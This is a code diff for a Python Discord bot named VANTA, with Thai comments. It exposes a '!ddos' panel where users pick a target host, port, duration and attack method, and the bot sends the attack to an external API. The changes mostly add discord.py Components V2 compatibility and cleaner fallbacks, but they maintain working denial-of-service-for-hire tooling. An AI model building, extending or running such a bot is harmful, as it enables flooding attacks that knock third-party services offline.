@@ -31,6 +31,33 @@ active_attacks: dict[int, dict] = {}
 
 
 # ═══════════════════════════════════════════
+# V2 Detection — รองรับ discord.py 2.5 และ 2.6+
+# ═══════════════════════════════════════════
+_HAS_V2 = (
+    hasattr(discord, "MessageFlags")
+    and hasattr(discord.MessageFlags, "components_v2")
+)
+
+
+def _send_kwargs(view, ephemeral: bool = False) -> dict:
+    """kwargs สำหรับ interaction.response.send_message / channel.send"""
+    kwargs = {"view": view}
+    if _HAS_V2:
+        kwargs["flags"] = discord.MessageFlags.components_v2
+    if ephemeral:
+        kwargs["ephemeral"] = True
+    return kwargs
+
+
+def _edit_kwargs(view) -> dict:
+    """kwargs สำหรับ edit_message"""
+    kwargs = {"view": view}
+    if _HAS_V2:
+        kwargs["flags"] = discord.MessageFlags.components_v2
+    return kwargs
+
+
+# ═══════════════════════════════════════════
 # Helpers
 # ═══════════════════════════════════════════
 def _extract_host(target: str) -> str:
@@ -80,13 +107,6 @@ def _parse_duration(s: str):
     return None
 
 
-def _edit_kwargs(view):
-    try:
-        return {"view": view, "flags": discord.MessageFlags.components_v2}
-    except AttributeError:
-        return {"view": view}
-
-
 # ═══════════════════════════════════════════
 # Events
 # ═══════════════════════════════════════════
@@ -95,7 +115,8 @@ async def on_ready():
     os.makedirs(DATA_DIR, exist_ok=True)
     await db.init()
     print(f"[VANTA] logged in as {bot.user}")
-    print(f"[VANTA] active attacks: {len(active_attacks)}")
+    print(f"[VANTA] discord.py = {discord.__version__}")
+    print(f"[VANTA] Components V2 = {'yes' if _HAS_V2 else 'NO — fallback to embed'}")
 
 
 @bot.event
@@ -113,13 +134,19 @@ async def on_command_error(ctx, error):
 
 
 # ═══════════════════════════════════════════
-# !ddos / !vi / !unvi
+# !ddos
 # ═══════════════════════════════════════════
 @bot.command(name="ddos", aliases=["panel"])
 async def ddos_cmd(ctx):
-    await ctx.send(**_edit_kwargs(build_panel()))
+    try:
+        await ctx.send(**_send_kwargs(build_panel()))
+    except TypeError:
+        await ctx.send(view=build_panel())
 
 
+# ═══════════════════════════════════════════
+# !vi / !unvi
+# ═══════════════════════════════════════════
 @bot.command(name="vi")
 async def vi_cmd(ctx, member: discord.Member = None, duration: str = "TH"):
     if ctx.author.id != OWNER_ID:
@@ -198,8 +225,7 @@ async def handle_attack_submit(interaction: discord.Interaction, modal):
 
     view = build_category_view(uid, target, port, dur)
     try:
-        await interaction.response.send_message(
-            ephemeral=True, **_edit_kwargs(view))
+        await interaction.response.send_message(**_send_kwargs(view, ephemeral=True))
     except TypeError:
         await interaction.response.send_message(view=view, ephemeral=True)
 
@@ -218,12 +244,12 @@ async def fire_attack(interaction: discord.Interaction, method: str,
                       target: str, port: int, dur: int):
     uid = interaction.user.id
 
+    view = build_running(method, target, port, dur, dur, "...")
     try:
-        await interaction.response.edit_message(
-            **_edit_kwargs(build_running(method, target, port, dur, dur, "...")))
+        await interaction.response.edit_message(**_edit_kwargs(view))
     except TypeError:
-        await interaction.response.edit_message(
-            view=build_running(method, target, port, dur, dur, "..."))
+        await interaction.response.edit_message(view=view)
+
     msg = await interaction.original_response()
 
     url = f"{API_BASE}/attack?key={API_KEY}"
@@ -250,13 +276,16 @@ async def fire_attack(interaction: discord.Interaction, method: str,
 
 
 async def _safe_edit(msg, view):
+    """แก้ข้อความ — fallback ถ้า V2 ไม่รองรับ"""
     try:
         await msg.edit(**_edit_kwargs(view))
+        return
     except Exception:
-        try:
-            await msg.edit(view=view)
-        except Exception:
-            pass
+        pass
+    try:
+        await msg.edit(view=view)
+    except Exception:
+        pass
 
 
 async def _tick(uid, state, method, target, port, dur):
@@ -267,7 +296,7 @@ async def _tick(uid, state, method, target, port, dur):
         left = max(0, int(dur - (time.time() - st)))
         await _safe_edit(msg, build_running(method, target, port, left, dur, "running"))
 
-    # fix M3: kill job ที่ API server
+    # kill job ที่ API
     try:
         async with aiohttp.ClientSession() as s:
             await s.post(
@@ -282,7 +311,7 @@ async def _tick(uid, state, method, target, port, dur):
 
 
 # ═══════════════════════════════════════════
-# Signal handler (fix M1)
+# Signal handler
 # ═══════════════════════════════════════════
 def _shutdown(sig, frame):
     print(f"\n[VANTA] signal {sig} received — shutting down")
